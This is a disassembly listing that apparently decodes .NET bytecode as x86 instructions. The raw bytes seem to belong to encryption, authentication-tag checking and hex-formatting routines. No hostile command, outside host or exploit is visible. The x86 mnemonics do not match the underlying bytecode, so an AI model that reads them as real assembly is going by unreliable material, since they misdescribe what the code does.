  4041b2:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  4041b8:	d3 00                	roll   %cl,(%eax)
  4041ba:	00 0a                	add    %cl,(%edx)
  4041bc:	07                   	pop    %es
  4041bd:	17                   	pop    %ss
  4041be:	6f                   	outsl  %ds:(%esi),(%dx)
  4041bf:	d4 00                	aam    $0x0
  4041c1:	00 0a                	add    %cl,(%edx)
  4041c3:	07                   	pop    %es
  4041c4:	18 6f d5             	sbb    %ch,-0x2b(%edi)
  4041c7:	00 00                	add    %al,(%eax)
  4041c9:	0a 07                	or     (%edi),%al
  4041cb:	02 7b 2a             	add    0x2a(%ebx),%bh
  4041ce:	00 00                	add    %al,(%eax)
  4041d0:	04 6f                	add    $0x6f,%al
  4041d2:	d6                   	salc
  4041d3:	00 00                	add    %al,(%eax)
  4041d5:	0a 07                	or     (%edi),%al
  4041d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4041d8:	d7                   	xlat   %ds:(%ebx)
  4041d9:	00 00                	add    %al,(%eax)
  4041db:	0a 06                	or     (%esi),%al
  4041dd:	07                   	pop    %es
  4041de:	6f                   	outsl  %ds:(%esi),(%dx)
  4041df:	d8 00                	fadds  (%eax)
  4041e1:	00 0a                	add    %cl,(%edx)
  4041e3:	17                   	pop    %ss
  4041e4:	73 d9                	jae    0x4041bf
  4041e6:	00 00                	add    %al,(%eax)
  4041e8:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4041eb:	07                   	pop    %es
  4041ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4041ed:	da 00                	fiaddl (%eax)
  4041ef:	00 0a                	add    %cl,(%edx)
  4041f1:	16                   	push   %ss
  4041f2:	07                   	pop    %es
  4041f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4041f4:	da 00                	fiaddl (%eax)
  4041f6:	00 0a                	add    %cl,(%edx)
  4041f8:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4041fb:	4c                   	dec    %esp
  4041fc:	00 00                	add    %al,(%eax)
  4041fe:	0a 08                	or     (%eax),%cl
  404200:	03 16                	add    (%esi),%edx
  404202:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  404208:	00 0a                	add    %cl,(%edx)
  40420a:	08 6f db             	or     %ch,-0x25(%edi)
  40420d:	00 00                	add    %al,(%eax)
  40420f:	0a 02                	or     (%edx),%al
  404211:	7b 2b                	jnp    0x40423e
  404213:	00 00                	add    %al,(%eax)
  404215:	04 73                	add    $0x73,%al
  404217:	dc 00                	faddl  (%eax)
  404219:	00 0a                	add    %cl,(%edx)
  40421b:	0d 09 06 6f dd       	or     $0xdd6f0609,%eax
  404220:	00 00                	add    %al,(%eax)
  404222:	0a 1f                	or     (%edi),%bl
  404224:	20 06                	and    %al,(%esi)
  404226:	6f                   	outsl  %ds:(%esi),(%dx)
  404227:	dd 00                	fldl   (%eax)
  404229:	00 0a                	add    %cl,(%edx)
  40422b:	8e 69 1f             	mov    0x1f(%ecx),%gs
  40422e:	20 59 6f             	and    %bl,0x6f(%ecx)
  404231:	de 00                	fiadds (%eax)
  404233:	00 0a                	add    %cl,(%edx)
  404235:	13 04 06             	adc    (%esi,%eax,1),%eax
  404238:	16                   	push   %ss
  404239:	6a 6f                	push   $0x6f
  40423b:	4e                   	dec    %esi
  40423c:	00 00                	add    %al,(%eax)
  40423e:	0a 06                	or     (%esi),%al
  404240:	11 04 16             	adc    %eax,(%esi,%edx,1)
  404243:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  404246:	69 6f 4c 00 00 0a dd 	imul   $0xdd0a0000,0x4c(%edi),%ebp
  40424d:	27                   	daa
  40424e:	00 00                	add    %al,(%eax)
  404250:	00 09                	add    %cl,(%ecx)
  404252:	39 06                	cmp    %eax,(%esi)
  404254:	00 00                	add    %al,(%eax)
  404256:	00 09                	add    %cl,(%ecx)
  404258:	6f                   	outsl  %ds:(%esi),(%dx)
  404259:	33 00                	xor    (%eax),%eax
  40425b:	00 0a                	add    %cl,(%edx)
  40425d:	dc 08                	fmull  (%eax)
  40425f:	39 06                	cmp    %eax,(%esi)
  404261:	00 00                	add    %al,(%eax)
  404263:	00 08                	add    %cl,(%eax)
  404265:	6f                   	outsl  %ds:(%esi),(%dx)
  404266:	33 00                	xor    (%eax),%eax
  404268:	00 0a                	add    %cl,(%edx)
  40426a:	dc 07                	faddl  (%edi)
  40426c:	39 06                	cmp    %eax,(%esi)
  40426e:	00 00                	add    %al,(%eax)
  404270:	00 07                	add    %al,(%edi)
  404272:	6f                   	outsl  %ds:(%esi),(%dx)
  404273:	33 00                	xor    (%eax),%eax
  404275:	00 0a                	add    %cl,(%edx)
  404277:	dc 06                	faddl  (%esi)
  404279:	6f                   	outsl  %ds:(%esi),(%dx)
  40427a:	dd 00                	fldl   (%eax)
  40427c:	00 0a                	add    %cl,(%edx)
  40427e:	13 05 dd 0d 00 00    	adc    0xddd,%eax
  404284:	00 06                	add    %al,(%esi)
  404286:	39 06                	cmp    %eax,(%esi)
  404288:	00 00                	add    %al,(%eax)
  40428a:	00 06                	add    %al,(%esi)
  40428c:	6f                   	outsl  %ds:(%esi),(%dx)
  40428d:	33 00                	xor    (%eax),%eax
  40428f:	00 0a                	add    %cl,(%edx)
  404291:	dc 11                	fcoml  (%ecx)
  404293:	05 2a 00 00 00       	add    $0x2a,%eax
  404298:	01 34 00             	add    %esi,(%eax,%eax,1)
  40429b:	00 02                	add    %al,(%edx)
  40429d:	00 9c 00 35 d1 00 0d 	add    %bl,0xd00d135(%eax,%eax,1)
  4042a4:	00 00                	add    %al,(%eax)
  4042a6:	00 00                	add    %al,(%eax)
  4042a8:	02 00                	add    (%eax),%al
  4042aa:	6a 00                	push   $0x0
  4042ac:	74 de                	je     0x40428c
  4042ae:	00 0d 00 00 00 00    	add    %cl,0x0
  4042b4:	02 00                	add    (%eax),%al
  4042b6:	26 00 c5             	es add %al,%ch
  4042b9:	eb 00                	jmp    0x4042bb
  4042bb:	0d 00 00 00 00       	or     $0x0,%eax
  4042c0:	02 00                	add    (%eax),%al
  4042c2:	17                   	pop    %ss
  4042c3:	00 ee                	add    %ch,%dh
  4042c5:	05 01 0d 00 00       	add    $0xd01,%eax
  4042ca:	00 00                	add    %al,(%eax)
  4042cc:	1b 30                	sbb    (%eax),%esi
  4042ce:	05 00 50 01 00       	add    $0x15000,%eax
  4042d3:	00 17                	add    %dl,(%edi)
  4042d5:	00 00                	add    %al,(%eax)
  4042d7:	11 03                	adc    %eax,(%ebx)
  4042d9:	3a 0b                	cmp    (%ebx),%cl
  4042db:	00 00                	add    %al,(%eax)
  4042dd:	00 72 57             	add    %dh,0x57(%edx)
  4042e0:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  4042e4:	cf                   	iret
  4042e5:	00 00                	add    %al,(%eax)
  4042e7:	0a 7a 03             	or     0x3(%edx),%bh
  4042ea:	73 4d                	jae    0x404339
  4042ec:	00 00                	add    %al,(%eax)
  4042ee:	0a 0a                	or     (%edx),%cl
  4042f0:	73 d1                	jae    0x4042c3
  4042f2:	00 00                	add    %al,(%eax)
  4042f4:	0a 0b                	or     (%ebx),%cl
  4042f6:	07                   	pop    %es
  4042f7:	20 00                	and    %al,(%eax)
  4042f9:	01 00                	add    %eax,(%eax)
  4042fb:	00 6f d2             	add    %ch,-0x2e(%edi)
  4042fe:	00 00                	add    %al,(%eax)
  404300:	0a 07                	or     (%edi),%al
  404302:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  404308:	d3 00                	roll   %cl,(%eax)
  40430a:	00 0a                	add    %cl,(%edx)
  40430c:	07                   	pop    %es
  40430d:	17                   	pop    %ss
  40430e:	6f                   	outsl  %ds:(%esi),(%dx)
  40430f:	d4 00                	aam    $0x0
  404311:	00 0a                	add    %cl,(%edx)
  404313:	07                   	pop    %es
  404314:	18 6f d5             	sbb    %ch,-0x2b(%edi)
  404317:	00 00                	add    %al,(%eax)
  404319:	0a 07                	or     (%edi),%al
  40431b:	02 7b 2a             	add    0x2a(%ebx),%bh
  40431e:	00 00                	add    %al,(%eax)
  404320:	04 6f                	add    $0x6f,%al
  404322:	d6                   	salc
  404323:	00 00                	add    %al,(%eax)
  404325:	0a 02                	or     (%edx),%al
  404327:	7b 2b                	jnp    0x404354
  404329:	00 00                	add    %al,(%eax)
  40432b:	04 73                	add    $0x73,%al
  40432d:	dc 00                	faddl  (%eax)
  40432f:	00 0a                	add    %cl,(%edx)
  404331:	0c 08                	or     $0x8,%al
  404333:	06                   	push   %es
  404334:	6f                   	outsl  %ds:(%esi),(%dx)
  404335:	dd 00                	fldl   (%eax)
  404337:	00 0a                	add    %cl,(%edx)
  404339:	1f                   	pop    %ds
  40433a:	20 06                	and    %al,(%esi)
  40433c:	6f                   	outsl  %ds:(%esi),(%dx)
  40433d:	dd 00                	fldl   (%eax)
  40433f:	00 0a                	add    %cl,(%edx)
  404341:	8e 69 1f             	mov    0x1f(%ecx),%gs
  404344:	20 59 6f             	and    %bl,0x6f(%ecx)
  404347:	de 00                	fiadds (%eax)
  404349:	00 0a                	add    %cl,(%edx)
  40434b:	0d 1f 20 8d 44       	or     $0x448d201f,%eax
  404350:	00 00                	add    %al,(%eax)
  404352:	01 13                	add    %edx,(%ebx)
  404354:	04 06                	add    $0x6,%al
  404356:	11 04 16             	adc    %eax,(%esi,%edx,1)
  404359:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  40435c:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  404363:	02 09                	add    (%ecx),%cl
  404365:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  404368:	50                   	push   %eax
  404369:	00 00                	add    %al,(%eax)
  40436b:	06                   	push   %es
  40436c:	3a 0b                	cmp    (%ebx),%cl
  40436e:	00 00                	add    %al,(%eax)
  404370:	00 72 85             	add    %dh,-0x7b(%edx)
  404373:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  404377:	df 00                	filds  (%eax)
  404379:	00 0a                	add    %cl,(%edx)
  40437b:	7a dd                	jp     0x40435a
  40437d:	0d 00 00 00 08       	or     $0x8000000,%eax
  404382:	39 06                	cmp    %eax,(%esi)
  404384:	00 00                	add    %al,(%eax)
  404386:	00 08                	add    %cl,(%eax)
  404388:	6f                   	outsl  %ds:(%esi),(%dx)
  404389:	33 00                	xor    (%eax),%eax
  40438b:	00 0a                	add    %cl,(%edx)
  40438d:	dc 1f                	fcompl (%edi)
  40438f:	10 8d 44 00 00 01    	adc    %cl,0x1000044(%ebp)
  404395:	13 05 06 11 05 16    	adc    0x16051106,%eax
  40439b:	1f                   	pop    %ds
  40439c:	10 6f 45             	adc    %ch,0x45(%edi)
  40439f:	00 00                	add    %al,(%eax)
  4043a1:	0a 26                	or     (%esi),%ah
  4043a3:	07                   	pop    %es
  4043a4:	11 05 6f e0 00 00    	adc    %eax,0xe06f
  4043aa:	0a 06                	or     (%esi),%al
  4043ac:	07                   	pop    %es
  4043ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4043ae:	e1 00                	loope  0x4043b0
  4043b0:	00 0a                	add    %cl,(%edx)
  4043b2:	16                   	push   %ss
  4043b3:	73 d9                	jae    0x40438e
  4043b5:	00 00                	add    %al,(%eax)
  4043b7:	0a 13                	or     (%ebx),%dl
  4043b9:	06                   	push   %es
  4043ba:	06                   	push   %es
  4043bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4043bc:	e2 00                	loop   0x4043be
  4043be:	00 0a                	add    %cl,(%edx)
  4043c0:	1f                   	pop    %ds
  4043c1:	10 6a 59             	adc    %ch,0x59(%edx)
  4043c4:	17                   	pop    %ss
  4043c5:	6a 58                	push   $0x58
  4043c7:	d4 8d                	aam    $0x8d
  4043c9:	44                   	inc    %esp
  4043ca:	00 00                	add    %al,(%eax)
  4043cc:	01 13                	add    %edx,(%ebx)
  4043ce:	07                   	pop    %es
  4043cf:	11 06                	adc    %eax,(%esi)
  4043d1:	11 07                	adc    %eax,(%edi)
  4043d3:	16                   	push   %ss
  4043d4:	11 07                	adc    %eax,(%edi)
  4043d6:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4043d9:	45                   	inc    %ebp
  4043da:	00 00                	add    %al,(%eax)
  4043dc:	0a 8d 44 00 00 01    	or     0x1000044(%ebp),%cl
  4043e2:	13 08                	adc    (%eax),%ecx
  4043e4:	11 07                	adc    %eax,(%edi)
  4043e6:	16                   	push   %ss
  4043e7:	11 08                	adc    %ecx,(%eax)
  4043e9:	16                   	push   %ss
  4043ea:	11 08                	adc    %ecx,(%eax)
  4043ec:	8e 69 28             	mov    0x28(%ecx),%gs
  4043ef:	e3 00                	jecxz  0x4043f1
  4043f1:	00 0a                	add    %cl,(%edx)
  4043f3:	11 08                	adc    %ecx,(%eax)
  4043f5:	13 09                	adc    (%ecx),%ecx
  4043f7:	dd 29                	(bad) (%ecx)
  4043f9:	00 00                	add    %al,(%eax)
  4043fb:	00 11                	add    %dl,(%ecx)
  4043fd:	06                   	push   %es
  4043fe:	39 07                	cmp    %eax,(%edi)
  404400:	00 00                	add    %al,(%eax)
  404402:	00 11                	add    %dl,(%ecx)
  404404:	06                   	push   %es
  404405:	6f                   	outsl  %ds:(%esi),(%dx)
  404406:	33 00                	xor    (%eax),%eax
  404408:	00 0a                	add    %cl,(%edx)
  40440a:	dc 07                	faddl  (%edi)
  40440c:	39 06                	cmp    %eax,(%esi)
  40440e:	00 00                	add    %al,(%eax)
  404410:	00 07                	add    %al,(%edi)
  404412:	6f                   	outsl  %ds:(%esi),(%dx)
  404413:	33 00                	xor    (%eax),%eax
  404415:	00 0a                	add    %cl,(%edx)
  404417:	dc 06                	faddl  (%esi)
  404419:	39 06                	cmp    %eax,(%esi)
  40441b:	00 00                	add    %al,(%eax)
  40441d:	00 06                	add    %al,(%esi)
  40441f:	6f                   	outsl  %ds:(%esi),(%dx)
  404420:	33 00                	xor    (%eax),%eax
  404422:	00 0a                	add    %cl,(%edx)
  404424:	dc 11                	fcoml  (%ecx)
  404426:	09 2a                	or     %ebp,(%edx)
  404428:	41                   	inc    %ecx
  404429:	64 00 00             	add    %al,%fs:(%eax)
  40442c:	02 00                	add    (%eax),%al
  40442e:	00 00                	add    %al,(%eax)
  404430:	5a                   	pop    %edx
  404431:	00 00                	add    %al,(%eax)
  404433:	00 4f 00             	add    %cl,0x0(%edi)
  404436:	00 00                	add    %al,(%eax)
  404438:	a9 00 00 00 0d       	test   $0xd000000,%eax
  40443d:	00 00                	add    %al,(%eax)
  40443f:	00 00                	add    %al,(%eax)
  404441:	00 00                	add    %al,(%eax)
  404443:	00 02                	add    %al,(%edx)
  404445:	00 00                	add    %al,(%eax)
  404447:	00 e2                	add    %ah,%dl
  404449:	00 00                	add    %al,(%eax)
  40444b:	00 42 00             	add    %al,0x0(%edx)
  40444e:	00 00                	add    %al,(%eax)
  404450:	24 01                	and    $0x1,%al
  404452:	00 00                	add    %al,(%eax)
  404454:	0f 00 00             	sldt   (%eax)
  404457:	00 00                	add    %al,(%eax)
  404459:	00 00                	add    %al,(%eax)
  40445b:	00 02                	add    %al,(%edx)
  40445d:	00 00                	add    %al,(%eax)
  40445f:	00 1e                	add    %bl,(%esi)
  404461:	00 00                	add    %al,(%eax)
  404463:	00 15 01 00 00 33    	add    %dl,0x33000001
  404469:	01 00                	add    %eax,(%eax)
  40446b:	00 0d 00 00 00 00    	add    %cl,0x0
  404471:	00 00                	add    %al,(%eax)
  404473:	00 02                	add    %al,(%edx)
  404475:	00 00                	add    %al,(%eax)
  404477:	00 18                	add    %bl,(%eax)
  404479:	00 00                	add    %al,(%eax)
  40447b:	00 28                	add    %ch,(%eax)
  40447d:	01 00                	add    %eax,(%eax)
  40447f:	00 40 01             	add    %al,0x1(%eax)
  404482:	00 00                	add    %al,(%eax)
  404484:	0d 00 00 00 00       	or     $0x0,%eax
  404489:	00 00                	add    %al,(%eax)
  40448b:	00 13                	add    %dl,(%ebx)
  40448d:	30 03                	xor    %al,(%ebx)
  40448f:	00 22                	add    %ah,(%edx)
  404491:	00 00                	add    %al,(%eax)
  404493:	00 18                	add    %bl,(%eax)
  404495:	00 00                	add    %al,(%eax)
  404497:	11 17                	adc    %edx,(%edi)
  404499:	0a 16                	or     (%esi),%dl
  40449b:	0b 38                	or     (%eax),%edi
  40449d:	11 00                	adc    %eax,(%eax)
  40449f:	00 00                	add    %al,(%eax)
  4044a1:	03 07                	add    (%edi),%eax
  4044a3:	91                   	xchg   %eax,%ecx
  4044a4:	04 07                	add    $0x7,%al
  4044a6:	91                   	xchg   %eax,%ecx
  4044a7:	3b 02                	cmp    (%edx),%eax
  4044a9:	00 00                	add    %al,(%eax)
  4044ab:	00 16                	add    %dl,(%esi)
  4044ad:	0a 07                	or     (%edi),%al
  4044af:	17                   	pop    %ss
  4044b0:	58                   	pop    %eax
  4044b1:	0b 07                	or     (%edi),%eax
  4044b3:	03 8e 69 32 e9 06    	add    0x6e93269(%esi),%ecx
  4044b9:	2a 00                	sub    (%eax),%al
  4044bb:	00 1b                	add    %bl,(%ebx)
  4044bd:	30 03                	xor    %al,(%ebx)
  4044bf:	00 6e 00             	add    %ch,0x0(%esi)
  4044c2:	00 00                	add    %al,(%eax)
  4044c4:	19 00                	sbb    %eax,(%eax)
  4044c6:	00 11                	add    %dl,(%ecx)
  4044c8:	28 19                	sub    %bl,(%ecx)
  4044ca:	00 00                	add    %al,(%eax)
  4044cc:	0a 02                	or     (%edx),%al
  4044ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4044cf:	1f                   	pop    %ds
  4044d0:	00 00                	add    %al,(%eax)
  4044d2:	0a 0a                	or     (%edx),%cl
  4044d4:	73 e5                	jae    0x4044bb
  4044d6:	00 00                	add    %al,(%eax)
  4044d8:	0a 0b                	or     (%ebx),%cl
  4044da:	07                   	pop    %es
  4044db:	06                   	push   %es
  4044dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4044dd:	8f 00                	pop    (%eax)
  4044df:	00 0a                	add    %cl,(%edx)
  4044e1:	0a dd                	or     %ch,%bl
  4044e3:	0d 00 00 00 07       	or     $0x7000000,%eax
  4044e8:	39 06                	cmp    %eax,(%esi)
  4044ea:	00 00                	add    %al,(%eax)
  4044ec:	00 07                	add    %al,(%edi)
  4044ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4044ef:	33 00                	xor    (%eax),%eax
  4044f1:	00 0a                	add    %cl,(%edx)
  4044f3:	dc 73 90             	fdivl  -0x70(%ebx)
  4044f6:	00 00                	add    %al,(%eax)
  4044f8:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4044fb:	0d 16 13 04 38       	or     $0x38041316,%eax
  404500:	1f                   	pop    %ds
  404501:	00 00                	add    %al,(%eax)
  404503:	00 09                	add    %cl,(%ecx)
  404505:	11 04 91             	adc    %eax,(%ecx,%edx,4)
  404508:	13 05 08 12 05 72    	adc    0x72051208,%eax
  40450e:	db 26                	(bad) (%esi)
  404510:	00 70 28             	add    %dh,0x28(%eax)
  404513:	91                   	xchg   %eax,%ecx
  404514:	00 00                	add    %al,(%eax)
  404516:	0a 6f 92             	or     -0x6e(%edi),%ch
  404519:	00 00                	add    %al,(%eax)
  40451b:	0a 26                	or     (%esi),%ah
  40451d:	11 04 17             	adc    %eax,(%edi,%edx,1)
  404520:	58                   	pop    %eax
  404521:	13 04 11             	adc    (%ecx,%edx,1),%eax
  404524:	04 09                	add    $0x9,%al
  404526:	8e 69 32             	mov    0x32(%ecx),%gs
  404529:	da 08                	fimull (%eax)
  40452b:	6f                   	outsl  %ds:(%esi),(%dx)
  40452c:	38 00                	cmp    %al,(%eax)
  40452e:	00 0a                	add    %cl,(%edx)
  404530:	6f                   	outsl  %ds:(%esi),(%dx)
  404531:	94                   	xchg   %eax,%esp
  404532:	00 00                	add    %al,(%eax)
  404534:	0a 2a                	or     (%edx),%ch
  404536:	00 00                	add    %al,(%eax)
  404538:	01 10                	add    %edx,(%eax)
  40453a:	00 00                	add    %al,(%eax)
  40453c:	02 00                	add    (%eax),%al
  40453e:	12 00                	adc    (%eax),%al
  404540:	0d 1f 00 0d 00       	or     $0xd001f,%eax
  404545:	00 00                	add    %al,(%eax)
  404547:	00 1b                	add    %bl,(%ebx)
  404549:	30 02                	xor    %al,(%edx)
  40454b:	00 22                	add    %ah,(%edx)
  40454d:	00 00                	add    %al,(%eax)
  40454f:	00 1a                	add    %bl,(%edx)
  404551:	00 00                	add    %al,(%eax)
  404553:	11 73 e5             	adc    %esi,-0x1b(%ebx)
  404556:	00 00                	add    %al,(%eax)
  404558:	0a 0a                	or     (%edx),%cl
  40455a:	06                   	push   %es
  40455b:	02 6f 8f             	add    -0x71(%edi),%ch
  40455e:	00 00                	add    %al,(%eax)
  404560:	0a 0b                	or     (%ebx),%cl
  404562:	dd 0d 00 00 00 06    	fisttpll 0x6000000
  404568:	39 06                	cmp    %eax,(%esi)
  40456a:	00 00                	add    %al,(%eax)
  40456c:	00 06                	add    %al,(%esi)
  40456e:	6f                   	outsl  %ds:(%esi),(%dx)
  40456f:	33 00                	xor    (%eax),%eax
  404571:	00 0a                	add    %cl,(%edx)
  404573:	dc 07                	faddl  (%edi)
  404575:	2a 00                	sub    (%eax),%al
  404577:	00 01                	add    %al,(%ecx)
  404579:	10 00                	adc    %al,(%eax)
  40457b:	00 02                	add    %al,(%edx)
  40457d:	00 06                	add    %al,(%esi)
  40457f:	00 0d 13 00 0d 00    	add    %cl,0xd0013
  404585:	00 00                	add    %al,(%eax)
  404587:	00 13                	add    %dl,(%ebx)
  404589:	30 03                	xor    %al,(%ebx)
  40458b:	00 3b                	add    %bh,(%ebx)
  40458d:	00 00                	add    %al,(%eax)
  40458f:	00 1b                	add    %bl,(%ebx)
  404591:	00 00                	add    %al,(%eax)
  404593:	11 73 90             	adc    %esi,-0x70(%ebx)
  404596:	00 00                	add    %al,(%eax)
  404598:	0a 0a                	or     (%edx),%cl
  40459a:	02 0b                	add    (%ebx),%cl
  40459c:	16                   	push   %ss
  40459d:	0c 38                	or     $0x38,%al
  40459f:	1f                   	pop    %ds
  4045a0:	00 00                	add    %al,(%eax)
  4045a2:	00 07                	add    %al,(%edi)
  4045a4:	08 91 0d 06 72 e1    	or     %dl,-0x1e8df9f3(%ecx)
  4045aa:	26 00 70 09          	add    %dh,%es:0x9(%eax)
  4045ae:	8c 44 00 00          	mov    %es,0x0(%eax,%eax,1)
  4045b2:	01 28                	add    %ebp,(%eax)
  4045b4:	e6 00                	out    %al,$0x0
  4045b6:	00 0a                	add    %cl,(%edx)
  4045b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4045b9:	92                   	xchg   %eax,%edx
  4045ba:	00 00                	add    %al,(%eax)
  4045bc:	0a 26                	or     (%esi),%ah
  4045be:	08 17                	or     %dl,(%edi)
  4045c0:	58                   	pop    %eax
  4045c1:	0c 08                	or     $0x8,%al
  4045c3:	07                   	pop    %es
  4045c4:	8e 69 32             	mov    0x32(%ecx),%gs
  4045c7:	db 06                	fildl  (%esi)
  4045c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4045ca:	38 00                	cmp    %al,(%eax)
  4045cc:	00 0a                	add    %cl,(%edx)
  4045ce:	2a 00                	sub    (%eax),%al
  4045d0:	13 30                	adc    (%eax),%esi
  4045d2:	03 00                	add    (%eax),%eax
  4045d4:	3b 00                	cmp    (%eax),%eax
  4045d6:	00 00                	add    %al,(%eax)
  4045d8:	1b 00                	sbb    (%eax),%eax
  4045da:	00 11                	add    %dl,(%ecx)
  4045dc:	73 90                	jae    0x40456e
  4045de:	00 00                	add    %al,(%eax)
  4045e0:	0a 0a                	or     (%edx),%cl
  4045e2:	02 0b                	add    (%ebx),%cl
  4045e4:	16                   	push   %ss
  4045e5:	0c 38                	or     $0x38,%al
  4045e7:	1f                   	pop    %ds
  4045e8:	00 00                	add    %al,(%eax)
  4045ea:	00 07                	add    %al,(%edi)
  4045ec:	08 91 0d 06 72 f1    	or     %dl,-0xe8df9f3(%ecx)
  4045f2:	26 00 70 09          	add    %dh,%es:0x9(%eax)
  4045f6:	8c 44 00 00          	mov    %es,0x0(%eax,%eax,1)
  4045fa:	01 28                	add    %ebp,(%eax)
  4045fc:	e6 00                	out    %al,$0x0
  4045fe:	00 0a                	add    %cl,(%edx)
  404600:	6f                   	outsl  %ds:(%esi),(%dx)
  404601:	92                   	xchg   %eax,%edx
  404602:	00 00                	add    %al,(%eax)
  404604:	0a 26                	or     (%esi),%ah
  404606:	08 17                	or     %dl,(%edi)
  404608:	58                   	pop    %eax
  404609:	0c 08                	or     $0x8,%al
  40460b:	07                   	pop    %es
  40460c:	8e 69 32             	mov    0x32(%ecx),%gs
  40460f:	db 06                	fildl  (%esi)
  404611:	6f                   	outsl  %ds:(%esi),(%dx)
  404612:	38 00                	cmp    %al,(%eax)
  404614:	00 0a                	add    %cl,(%edx)
  404616:	2a 00                	sub    (%eax),%al
  404618:	13 30                	adc    (%eax),%esi
  40461a:	04 00                	add    $0x0,%al
  40461c:	2c 00                	sub    $0x0,%al
  40461e:	00 00                	add    %al,(%eax)
  404620:	1c 00                	sbb    $0x0,%al
  404622:	00 11                	add    %dl,(%ecx)
  404624:	02 8e 69 8d 44 00    	add    0x448d69(%esi),%cl
  40462a:	00 01                	add    %al,(%ecx)
  40462c:	0a 02                	or     (%edx),%al
  40462e:	8e 69 17             	mov    0x17(%ecx),%gs
  404631:	59                   	pop    %ecx
  404632:	0b 16                	or     (%esi),%edx
  404634:	0c 38                	or     $0x38,%al
  404636:	0e                   	push   %cs
  404637:	00 00                	add    %al,(%eax)
  404639:	00 06                	add    %al,(%esi)
  40463b:	08 02                	or     %al,(%edx)
  40463d:	07                   	pop    %es
  40463e:	91                   	xchg   %eax,%ecx
  40463f:	9c                   	pushf
  404640:	07                   	pop    %es
  404641:	17                   	pop    %ss
  404642:	59                   	pop    %ecx
  404643:	0b 08                	or     (%eax),%ecx
  404645:	17                   	pop    %ss
  404646:	58                   	pop    %eax
  404647:	0c 08                	or     $0x8,%al
  404649:	06                   	push   %es
  40464a:	8e 69 32             	mov    0x32(%ecx),%gs
  40464d:	ec                   	in     (%dx),%al
  40464e:	06                   	push   %es
  40464f:	2a 13                	sub    (%ebx),%dl
  404651:	30 02                	xor    %al,(%edx)
  404653:	00 36                	add    %dh,(%esi)
  404655:	00 00                	add    %al,(%eax)
  404657:	00 01                	add    %al,(%ecx)
  404659:	00 00                	add    %al,(%eax)
  40465b:	11 16                	adc    %edx,(%esi)
  40465d:	0a 38                	or     (%eax),%bh
  40465f:	15 00 00 00 02       	adc    $0x2000000,%eax
  404664:	7b 38                	jnp    0x40469e
  404666:	00 00                	add    %al,(%eax)
  404668:	04 06                	add    $0x6,%al
  40466a:	6f                   	outsl  %ds:(%esi),(%dx)
  40466b:	ea 00 00 0a 6f 6b 00 	ljmp   $0x6b,$0x6f0a0000
  404672:	00 06                	add    %al,(%esi)
  404674:	06                   	push   %es
  404675:	17                   	pop    %ss
  404676:	58                   	pop    %eax
  404677:	0a 06                	or     (%esi),%al
  404679:	02 7b 38             	add    0x38(%ebx),%bh
  40467c:	00 00                	add    %al,(%eax)
  40467e:	04 6f                	add    $0x6f,%al
  404680:	eb 00                	jmp    0x404682
  404682:	00 0a                	add    %cl,(%edx)
  404684:	32 dd                	xor    %ch,%bl
  404686:	02 7b 38             	add    0x38(%ebx),%bh
  404689:	00 00                	add    %al,(%eax)
  40468b:	04 6f                	add    $0x6f,%al
  40468d:	ec                   	in     (%dx),%al
  40468e:	00 00                	add    %al,(%eax)
  404690:	0a 2a                	or     (%edx),%ch
  404692:	00 00                	add    %al,(%eax)
  404694:	13 30                	adc    (%eax),%esi
  404696:	02 00                	add    (%eax),%al
  404698:	1b 00                	sbb    (%eax),%eax
  40469a:	00 00                	add    %al,(%eax)
  40469c:	1d 00 00 11 73       	sbb    $0x73110000,%eax
  4046a1:	94                   	xchg   %eax,%esp
  4046a2:	00 00                	add    %al,(%eax)
  4046a4:	06                   	push   %es
  4046a5:	0a 06                	or     (%esi),%al
  4046a7:	02 7d 37             	add    0x37(%ebp),%bh
  4046aa:	00 00                	add    %al,(%eax)
  4046ac:	04 02                	add    $0x2,%al
  4046ae:	7b 38                	jnp    0x4046e8
  4046b0:	00 00                	add    %al,(%eax)
  4046b2:	04 06                	add    $0x6,%al
  4046b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4046b5:	b9 00 00 0a 06       	mov    $0x60a0000,%ecx
  4046ba:	2a 00                	sub    (%eax),%al
  4046bc:	1b 30                	sbb    (%eax),%esi
  4046be:	02 00                	add    (%eax),%al
  4046c0:	60                   	pusha
  4046c1:	00 00                	add    %al,(%eax)
  4046c3:	00 1e                	add    %bl,(%esi)
  4046c5:	00 00                	add    %al,(%eax)
  4046c7:	11 15 0a 15 0b 03    	adc    %edx,0x30b150a
  4046cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4046ce:	7d 00                	jge    0x4046d0
  4046d0:	00 0a                	add    %cl,(%edx)
  4046d2:	0c 02                	or     $0x2,%al
  4046d4:	7b 38                	jnp    0x40470e
  4046d6:	00 00                	add    %al,(%eax)
  4046d8:	04 6f                	add    $0x6f,%al
  4046da:	bb 00 00 0a 0d       	mov    $0xd0a0000,%ebx
  4046df:	38 26                	cmp    %ah,(%esi)
  4046e1:	00 00                	add    %al,(%eax)
  4046e3:	00 12                	add    %dl,(%edx)
  4046e5:	03 28                	add    (%eax),%ebp
  4046e7:	bc 00 00 0a 13       	mov    $0x130a0000,%esp
  4046ec:	04 06                	add    $0x6,%al
  4046ee:	17                   	pop    %ss
  4046ef:	58                   	pop    %eax
  4046f0:	0a 08                	or     (%eax),%cl
